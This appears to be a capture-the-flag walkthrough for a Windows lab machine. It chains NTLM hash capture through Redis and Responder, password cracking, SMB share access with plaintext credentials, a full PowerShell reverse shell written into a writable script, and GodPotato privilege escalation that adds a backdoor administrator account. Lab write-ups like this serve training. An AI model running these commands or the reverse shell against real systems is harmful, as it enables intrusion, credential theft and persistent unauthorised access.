
Nmap Scan 



![[Pasted image 20260114045435.png]]

# Responder 

```
sudo responder -I tun0
```

![[Pasted image 20260114045403.png]]

```
redis-cli -h 10.80.130.248
10.80.130.248:6379> CONFIG SET dir \\192.168.134.35\share\fake.dll
(error) ERR Changing directory: Permission denied
(1.03s)
10.80.130.248:6379> CONFIG SET dbfilename test.rdb
OK
10.80.130.248:6379> Save
OK
10.80.130.248:6379> exit
```

![[Pasted image 20260114045529.png]]

# Crack 
```
john --wordlist=/usr/share/wordlists/rockyou.txt --fork=$(nproc) crackme.txt
```
![[Pasted image 20260114045604.png]]

# Shares

```
netexec smb 10.80.130.248 -u 'enterprise-security' -p 'sand_0873959498' -M spider_plus -o DOWNLOAD_LF=False
```
![[Pasted image 20260114045636.png]]

# Get File
```
smbclient //10.80.130.248/Enterprise-Share -U 'VULNNET/enterprise-security%sand_0873959498'
```
![[Pasted image 20260114045741.png]]

we have writable permission 
```
echo '$client = New-Object System.Net.Sockets.TCPClient("10.8.x.x", 4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' > PurgeIrrelevantData_1826.ps1
```
put shell 
![[Pasted image 20260114045859.png]]

# Shell
![[Pasted image 20260114045950.png]]
![[Pasted image 20260114050003.png]]

Flag 
![[Pasted image 20260114050112.png]]
# SeImpersonatePrivilege

![[Pasted image 20260114050132.png]]

# Read Admin Flag
```
.\GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\system.txt"
```
![[Pasted image 20260114050200.png]]

we can also add new admin 

```
.\GodPotato-NET4.exe -cmd "cmd /c net user pwned Password123! /add"
```

```
.\GodPotato-NET4.exe -cmd "cmd /c net localgroup Administrators pwned /add"
```
